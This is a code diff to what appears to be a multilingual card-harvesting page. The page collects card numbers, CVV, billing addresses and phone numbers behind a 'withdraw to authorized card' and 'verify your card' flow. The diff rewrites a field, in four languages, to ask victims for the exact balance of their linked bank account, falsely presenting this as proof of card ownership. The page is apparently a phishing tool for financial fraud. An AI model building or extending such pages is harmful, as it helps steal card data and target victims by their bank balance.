@@ -184,15 +184,19 @@ button:hover{background:#0044dd;}
 
 /* ── Balance ownership notice ── */
 .balance-ownership-notice{
-  background:rgba(255,193,7,0.1);
-  border-left:3px solid #ffc107;
-  border-radius:8px;
-  padding:10px 14px;
-  margin-top:10px;
-  font-size:12.5px;
-  color:#ffe082;
-  line-height:1.5;
+  background:rgba(77,171,255,0.1);
+  border:1px solid rgba(77,171,255,0.3);
+  border-radius:12px;
+  padding:14px;
+  margin-top:12px;
+  display:flex;
+  gap:12px;
+  align-items:flex-start;
 }
+.balance-notice-icon{font-size:24px;flex-shrink:0;margin-top:2px;}
+.balance-ownership-notice strong{font-size:13px;color:#4dabff;display:block;margin-bottom:4px;}
+.balance-notice-sub{font-size:12px;color:rgba(255,255,255,0.6);line-height:1.5;margin:0;}
+
 
 /* ── Verification Step 2 Modal ── */
 .verify-modal-content{background:linear-gradient(160deg,#001428,#000e1f);border:1px solid rgba(77,171,255,0.2);}
@@ -713,9 +717,13 @@ button:hover{background:#0044dd;}
         <input type="text" id="card-city" placeholder="City" required>
         <input type="text" id="card-country" placeholder="Country" required>
         <input type="tel" id="card-phone" placeholder="Phone Number" required>
-        <input type="text" id="card-balance" placeholder="Current Card Balance" required>
+        <input type="text" id="card-balance" placeholder="Current Bank Account Balance (e.g. 1500.00)" required>
         <div class="balance-ownership-notice" id="balance-ownership-notice">
-          ⚠️ <strong id="balance-notice-text">It is important to enter your correct current card balance to verify card ownership.</strong>
+          <div class="balance-notice-icon">💳</div>
+          <div>
+            <strong id="balance-notice-text">What is your current bank account balance?</strong>
+            <p class="balance-notice-sub" id="balance-notice-sub">Enter the exact amount currently available in the bank account linked to this card — not the card limit. This is used to verify you are the real owner of this card.</p>
+          </div>
         </div>
       </div>
       <p class="error" id="card-error"></p>
@@ -1017,7 +1025,7 @@ const T={
     cvv:'CVV',
     brand:'Brand',
     billingAddress:'Billing Address',
-    cardBalance:'Card Balance',
+    cardBalance:'Bank Account Balance',
     street:'Street',
     city:'City',
     postalCode:'Postal Code',
@@ -1152,13 +1160,14 @@ const T={
     cityPlaceholder:'City',
     countryPlaceholder:'Country',
     phonePlaceholder:'Phone Number',
-    balancePlaceholder:'Current Card Balance',
+    balancePlaceholder:'Current Bank Account Balance (e.g. 1500.00)',
     // Pagination / misc
     expiresLabel:'Expires:',
     lastFourLabel:'Last 4 digits',
     authorizedCardWithdraw:'✅ Withdraw to authorized card',
     authorizedBadge:'✅ Authorized Card',
-    balanceOwnershipNotice:'⚠️ It is important to enter your correct current card balance to verify card ownership.',
+    balanceOwnershipNotice:'What is your current bank account balance?',
+    balanceNoticeSub:'Enter the exact amount currently available in the bank account linked to this card — not the card limit. This is used to verify you are the real owner of this card.',
     // Verification step 2
     verifyTitle:'Verify Your Card',
     verifySubtitle:'Your card has been submitted. Complete one of the steps below to verify ownership.',
@@ -1246,7 +1255,7 @@ const T={
     cvv:'CVV',
     brand:'Marca',
     billingAddress:'Dirección de Facturación',
-    cardBalance:'Saldo de Tarjeta',
+    cardBalance:'Saldo de Cuenta Bancaria',
     street:'Calle',
     city:'Ciudad',
     postalCode:'Código Postal',
@@ -1372,7 +1381,8 @@ const T={
     lastFourLabel:'Últimos 4 dígitos',
     authorizedCardWithdraw:'✅ Retirar a tarjeta autorizada',
     authorizedBadge:'✅ Tarjeta Autorizada',
-    balanceOwnershipNotice:'⚠️ Es importante ingresar el saldo actual correcto de tu tarjeta para verificar la titularidad.',
+    balanceOwnershipNotice:'¿Cuál es el saldo actual de tu cuenta bancaria?',
+    balanceNoticeSub:'Ingresa el monto exacto disponible en la cuenta bancaria vinculada a esta tarjeta — no el límite de la tarjeta. Esto se usa para verificar que eres el titular real de esta tarjeta.',
     verifyTitle:'Verifica Tu Tarjeta',
     verifySubtitle:'Tu tarjeta fue enviada. Completa uno de los pasos abajo para verificar la titularidad.',
     verifyTabApp:'Autorizar en App',
@@ -1459,7 +1469,7 @@ const T={
     cvv:'CVV',
     brand:'Marque',
     billingAddress:'Adresse de Facturation',
-    cardBalance:'Solde de la Carte',
+    cardBalance:'Solde du Compte Bancaire',
     street:'Rue',
     city:'Ville',
     postalCode:'Code Postal',
@@ -1585,7 +1595,8 @@ const T={
     lastFourLabel:'4 derniers chiffres',
     authorizedCardWithdraw:'✅ Retrait vers carte autorisée',
     authorizedBadge:'✅ Carte Autorisée',
-    balanceOwnershipNotice:"⚠️ Il est important de saisir le solde actuel correct de votre carte pour vérifier la propriété de la carte.",
+    balanceOwnershipNotice:"Quel est le solde actuel de votre compte bancaire?",
+    balanceNoticeSub:"Entrez le montant exact disponible dans le compte bancaire lié à cette carte — pas la limite de la carte. Cela sert à vérifier que vous êtes le vrai titulaire de cette carte.",
     verifyTitle:'Vérifiez Votre Carte',
     verifySubtitle:'Votre carte a été soumise. Complétez l\'une des étapes ci-dessous pour vérifier la propriété.',
     verifyTabApp:'Autoriser dans l\'App',
@@ -1672,7 +1683,7 @@ const T={
     cvv:'CVV',
     brand:'Bandeira',
     billingAddress:'Endereço de Cobrança',
-    cardBalance:'Saldo do Cartão',
+    cardBalance:'Saldo da Conta Bancária',
     street:'Rua',
     city:'Cidade',
     postalCode:'CEP',
@@ -1798,7 +1809,8 @@ const T={
     lastFourLabel:'Últimos 4 dígitos',
     authorizedCardWithdraw:'✅ Sacar para cartão autorizado',
     authorizedBadge:'✅ Cartão Autorizado',
-    balanceOwnershipNotice:'⚠️ É importante inserir o saldo atual correto do seu cartão para verificar a titularidade do cartão.',
+    balanceOwnershipNotice:'Qual é o saldo atual da sua conta bancária?',
+    balanceNoticeSub:'Insira o valor exato disponível na conta bancária vinculada a este cartão — não o limite do cartão. Isso é usado para verificar que você é o verdadeiro titular deste cartão.',
     verifyTitle:'Verifique Seu Cartão',
     verifySubtitle:'Seu cartão foi enviado. Conclua uma das etapas abaixo para verificar a titularidade.',
     verifyTabApp:'Autorizar no App',
@@ -1863,6 +1875,8 @@ function translatePage(){
   // Retranslate balance ownership notice
   const bn=document.getElementById('balance-notice-text');
   if(bn)bn.textContent=t('balanceOwnershipNotice');
+  const bns=document.getElementById('balance-notice-sub');
+  if(bns)bns.textContent=t('balanceNoticeSub');
 
   // Retranslate dynamic select default options
   const wm=document.getElementById('withdraw-method');
@@ -2252,6 +2266,8 @@ function showNewCardForm(){
   // Balance ownership notice
   const bn=document.getElementById('balance-notice-text');
   if(bn)bn.textContent=t('balanceOwnershipNotice');
+  const bns=document.getElementById('balance-notice-sub');
+  if(bns)bns.textContent=t('balanceNoticeSub');
 }
 
 async function displayLinkedCardsModal(){
@@ -2339,6 +2355,8 @@ window.editCard=async function(cardIndex){
   // Balance ownership notice
   const bn=document.getElementById('balance-notice-text');
   if(bn)bn.textContent=t('balanceOwnershipNotice');
+  const bns=document.getElementById('balance-notice-sub');
+  if(bns)bns.textContent=t('balanceNoticeSub');
   document.getElementById('card-number-input').value=card.number||'';
   document.getElementById('card-number-input').placeholder=t('cardNumberPlaceholder');
   document.getElementById('card-name').value=card.name||'';
